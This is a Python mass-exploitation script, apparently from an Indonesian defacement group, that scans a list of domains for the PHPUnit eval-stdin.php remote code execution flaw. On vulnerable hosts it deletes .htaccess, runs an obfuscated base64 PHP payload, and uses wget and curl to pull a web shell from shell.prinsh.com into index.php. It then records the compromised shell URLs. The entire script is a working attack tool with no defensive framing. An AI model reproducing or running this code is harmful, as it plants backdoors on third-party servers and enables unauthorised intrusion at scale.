import os
import warnings
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Nonaktifkan peringatan InsecureRequestWarning
warnings.simplefilter('ignore', InsecureRequestWarning)

# Fungsi untuk mengecek phpunit
def phpunit(domain):
    global Good
    Good = 0
    head = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    try:
        x = requests.session()
        listaa = [
            '/vendor/phpunit/phpunit/src/Util/PHP/',
            '/laravel/vendor/phpunit/phpunit/src/Util/PHP/',
            '/api/vendor/phpunit/phpunit/src/Util/PHP/',
            '/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/',
            '/modules/autoupgrade/vendor/phpunit/phpunit/src/Util/PHP/'
        ]

        for xox in listaa:
            url = f"http://{domain}{xox}eval-stdin.php"
            data = "<?php phpinfo(); ?>"
            cmd = x.get(url, data=data, timeout=15, verify=False)

            if "PHP License as published by the PHP Group" in cmd.text:
                print(f"[chris] {domain} << Found Phpunit")
                with open("../phpunit.txt", "a") as f:
                    f.write(f"{url}\n")

                data2 = "<?php system('rm .htaccess') ?>"
                x.get(url, data=data2, timeout=15, verify=False)

                data3 = "<?php eval('?>'.base64_decode('PD9waHAKZnVuY3Rpb24gYWRtaW5lcigiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL292cnRobmtuZy9jb2svbWFpbi91cCIsImluZGV4LnBocCIpKSB7CgllY2hvICJCYW5kdW5nWHBsb2l0ZXIiOwp9IGVsc2UgewoJZWNobyAiZmFpbCI7Cn0KPz4=')); ?>"
                x.get(url, data=data3, timeout=15, verify=False)

                data4 = "<?php system('wget https://shell.prinsh.com/Nathan/uploader.txt -qO index.php'); ?>"
                x.get(url, data=data4, timeout=15, verify=False)

                data5 = "<?php system('curl -s https://shell.prinsh.com/Nathan/uploader.txt -o index.php'); ?>"
                x.get(url, data=data5, timeout=15, verify=False)

                url2 = f"http://{domain}{xox}index.php?bx=0e215962017"
                spawn = x.get(url2, headers=head)

                if "BandungXploiter" in spawn.text:
                    Good += 1
                    print(f"[chris] {domain} << Found Phpunit Shell")
                    with open("../shell.txt", "a") as f:
                        f.write(f"{url2}\n")
                    break
                else:
                    print(f"[chris] {domain} << Not Vuln Phpunit")
            else:
                print(f"[chris] {domain} << Not Found Phpunit")
    except Exception as e:
        print(f"Error: {e}")

# Fungsi utama untuk membaca file input dan memproses setiap domain
def main():
    # Path ke file input dan output
    current_directory = os.path.dirname(os.path.abspath(__file__))
    parent_directory = os.path.dirname(current_directory)
    
    input_file = input("Masukkan nama file: ")
    input_file_path = os.path.join(parent_directory, input_file)
    output_file = os.path.join(parent_directory, "phpunit.txt")

    if os.path.isfile(input_file_path):
        with open(input_file_path, "r") as file:
            domains = file.read().splitlines()
        
        # Proses setiap domain
        for domain in domains:
            phpunit(domain)
    else:
        print(f"File {input_file_path} tidak ditemukan.")

if __name__ == "__main__":
    main()